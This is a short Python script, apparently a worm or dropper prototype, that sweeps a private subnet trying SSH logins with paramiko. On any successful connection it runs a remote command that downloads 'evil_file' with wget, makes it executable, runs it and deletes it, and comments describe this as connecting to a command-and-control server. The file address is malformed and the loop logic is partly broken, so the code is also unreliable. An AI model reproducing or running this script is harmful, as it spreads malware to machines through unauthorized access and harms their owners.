import paramiko
import time

# ssh process
p = paramiko.SSHClient()

# set policy when host key is unknown
p.set_missing_host_key_policy(paramiko.AutoAddPolicy())


# Run through network 192.168.203.1/24
# Small dictionary attack for user & password. (not yet implemented)
for i in range(1,257):
    ip = "192.168.203.%d" % i
    try:
        p.connect(ip, username='random', password='random')
    except:
        print("Couldn't Connect")
        i += 1
        print(ip)
        if i ==  256:
            print("IP range ended.")
            break
        continue

# if connection successful
# 1. Download file from Web server.
# 2. Execute file, connect to C&C.
# 3. Exit
    stdin, stdout, stderr = p.exec_command('wget "127.0.0.0.1/evil_file"; chmod 755 evil_file; ./evil_file; rm evil_file')

    for line in stdout:
        print(line.strip('\n'))
    for line in stderr:
        print(line.strip('\n'))
    p.close()
